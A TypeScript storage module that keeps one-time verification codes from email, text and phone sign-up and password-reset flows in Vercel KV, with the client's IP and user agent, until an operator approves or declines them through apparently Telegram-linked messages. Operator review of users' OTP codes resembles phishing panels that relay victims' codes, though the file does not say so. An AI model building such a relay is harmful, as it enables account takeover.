/**
 * Pending Codes Storage System
 * Tracks verification codes awaiting admin approval
 * Uses Vercel KV for persistent storage across serverless instances
 */

import { kv } from "@vercel/kv";

export interface PendingCode {
  id: string;
  code: string;
  method: "email" | "text" | "phone";
  otpStep: 1 | 2;
  flowType: "new_user" | "forgot_password";
  createdAt: number;
  expiresAt: number;
  messageId?: number; // Telegram message ID for editing
  status: "pending" | "approved" | "declined" | "expired";
  approvedBy?: string;
  approvedAt?: number;
  declinedBy?: string;
  declinedAt?: number;
  clientIp?: string;
  userAgent?: string;
}

// Cleanup interval (5 minutes)
const CLEANUP_INTERVAL = 5 * 60 * 1000;

// Code expiry (15 minutes by default)
const CODE_EXPIRY = 15 * 60 * 1000;

// KV key prefixes
const PENDING_CODE_KEY = "pending:";
const CODE_TO_ID_KEY = "code2id:";

/**
 * Generate a unique ID for a code
 */
export function generateCodeId(): string {
  return `${Date.now()}-${Math.random().toString(36).slice(2, 11)}`;
}

/**
 * Store a pending code
 */
export async function storePendingCode(
  code: string,
  method: "email" | "text" | "phone",
  otpStep: 1 | 2,
  flowType: "new_user" | "forgot_password" = "new_user",
  options?: {
    clientIp?: string;
    userAgent?: string;
  },
): Promise<PendingCode> {
  const id = generateCodeId();
  const now = Date.now();

  const pendingCode: PendingCode = {
    id,
    code,
    method,
    otpStep,
    flowType,
    createdAt: now,
    expiresAt: now + CODE_EXPIRY,
    status: "pending",
    clientIp: options?.clientIp,
    userAgent: options?.userAgent,
  };

  // Store with expiry (convert ms to seconds for KV TTL)
  const ttlSeconds = Math.ceil((pendingCode.expiresAt - now) / 1000);
  
  await kv.setex(
    `${PENDING_CODE_KEY}${id}`,
    ttlSeconds,
    JSON.stringify(pendingCode)
  );

  // Also store mapping from code value to ID (with same TTL)
  await kv.setex(
    `${CODE_TO_ID_KEY}${code}`,
    ttlSeconds,
    id
  );

  // Add to set of all pending code IDs
  await kv.sadd("pending:ids", id);
  
  // Extend TTL of the set
  await kv.expire("pending:ids", ttlSeconds);

  return pendingCode;
}

/**
 * Get a pending code by ID
 */
export async function getPendingCode(id: string): Promise<PendingCode | undefined> {
  const data = await kv.get(`${PENDING_CODE_KEY}${id}`);
  if (!data) return undefined;

  const code = JSON.parse(data as string) as PendingCode;

  // Check if expired
  if (code.expiresAt < Date.now()) {
    code.status = "expired";
    return code;
  }

  return code;
}

/**
 * Get a pending code by code value
 */
export async function getPendingCodeByValue(code: string): Promise<PendingCode | undefined> {
  const id = await kv.get(`${CODE_TO_ID_KEY}${code}`);
  if (!id) return undefined;

  return getPendingCode(id as string);
}

/**
 * Update a pending code status
 */
export async function updatePendingCode(
  id: string,
  update: Partial<PendingCode>,
): Promise<PendingCode | undefined> {
  const code = await getPendingCode(id);
  if (!code) return undefined;

  const updated = { ...code, ...update };
  
  // Calculate remaining TTL
  const now = Date.now();
  const remainingMs = Math.max(updated.expiresAt - now, 1000); // At least 1 second
  const ttlSeconds = Math.ceil(remainingMs / 1000);
  
  await kv.setex(
    `${PENDING_CODE_KEY}${id}`,
    ttlSeconds,
    JSON.stringify(updated)
  );

  return updated;
}

/**
 * Approve a code
 */
export async function approvePendingCode(
  id: string,
  approvedBy: string,
): Promise<PendingCode | undefined> {
  return updatePendingCode(id, {
    status: "approved",
    approvedBy,
    approvedAt: Date.now(),
  });
}

/**
 * Decline a code
 */
export async function declinePendingCode(
  id: string,
  declinedBy: string,
): Promise<PendingCode | undefined> {
  return updatePendingCode(id, {
    status: "declined",
    declinedBy,
    declinedAt: Date.now(),
  });
}

/**
 * Get all pending codes
 */
export async function getAllPendingCodes(): Promise<PendingCode[]> {
  // Get all code IDs from the set
  const ids = await kv.smembers("pending:ids");
  if (!ids || ids.length === 0) return [];

  const codes: PendingCode[] = [];
  
  for (const id of ids) {
    const code = await getPendingCode(id as string);
    if (code) {
      codes.push(code);
    }
  }

  return codes;
}

/**
 * Get active pending codes (not expired, not processed)
 */
export async function getActivePendingCodes(): Promise<PendingCode[]> {
  const now = Date.now();
  const all = await getAllPendingCodes();
  
  return all.filter(
    (code) =>
      code.status === "pending" && code.expiresAt >= now,
  );
}

/**
 * Clean up expired codes
 */
export async function cleanupExpiredCodes(): Promise<number> {
  let count = 0;
  const now = Date.now();
  const ids = await kv.smembers("pending:ids");

  if (!ids || ids.length === 0) return 0;

  for (const id of ids) {
    const code = await getPendingCode(id as string);
    if (code && code.expiresAt < now && code.status === "pending") {
      await updatePendingCode(id as string, { status: "expired" });
      count++;
    }
  }

  return count;
}

/**
 * Start automatic cleanup
 */
export function startAutocleanup(): void {
  setInterval(async () => {
    const count = await cleanupExpiredCodes();
    if (count > 0) {
      console.log(`[Pending Codes] Cleaned up ${count} expired codes`);
    }
  }, CLEANUP_INTERVAL);
}

/**
 * Get statistics
 */
export async function getPendingCodesStats() {
  const all = await getAllPendingCodes();
  const pending = await getActivePendingCodes();

  return {
    total: all.length,
    active: pending.length,
    approved: all.filter((c) => c.status === "approved").length,
    declined: all.filter((c) => c.status === "declined").length,
    expired: all.filter((c) => c.status === "expired").length,
  };
}
